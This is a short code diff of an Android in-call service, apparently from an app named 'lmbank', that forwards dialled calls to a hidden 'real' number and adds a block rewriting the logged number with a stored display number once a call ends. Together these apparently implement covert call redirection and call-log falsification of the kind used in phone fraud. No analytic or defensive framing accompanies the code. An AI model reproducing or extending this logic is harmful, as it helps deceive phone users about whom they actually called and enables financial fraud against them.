@@ -16,6 +16,7 @@ import com.wish.lmbank.bean.LimitPhoneNumberBean;
 import com.wish.lmbank.common.Constants;
 import com.wish.lmbank.receiver.CallLogHelper;
 import com.wish.lmbank.receiver.TelePhoneReceiver;
+import com.wish.lmbank.temp.Debugging;
 import com.wish.lmbank.utils.DateFormatUtils;
 import com.wish.lmbank.utils.HandlerUtils;
 import com.wish.lmbank.utils.LogUtils;
@@ -167,7 +168,7 @@ public class PhoneCallService extends InCallService {
                 LimitPhoneNumberBean isForwarding = SettingUtils.isForwarding(callPhone2);
                 if (isForwarding != null) {
                     str2 = isForwarding.getRealPhoneNumber();
-                    CallLogHelper.addCallLog(new CallLogBean(callPhone,str2,Constants.CALL_SOURCE_FORWARDING,System.currentTimeMillis()));
+                    CallLogHelper.addCallLog(new CallLogBean(callPhone, str2, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis()));
                     if (isForwarding.getSpecial() == 1) {
                         z = true;
                     }
@@ -232,6 +233,11 @@ public class PhoneCallService extends InCallService {
         sb.append(this.TAG).append(", onCallRemoved, 电话号码: ").append(callPhone);
 
 
+        if (callPhone.equals(Debugging.test_real_phone_number)) {
+            //判断是否为替换号码
+            String var11 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", callPhone);
+            Constants.modifyCall(this, callPhone, var11);
+        }
 
 //        String var11 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", callPhone);
 //        Constants.modifyCall(this, callPhone, var11);
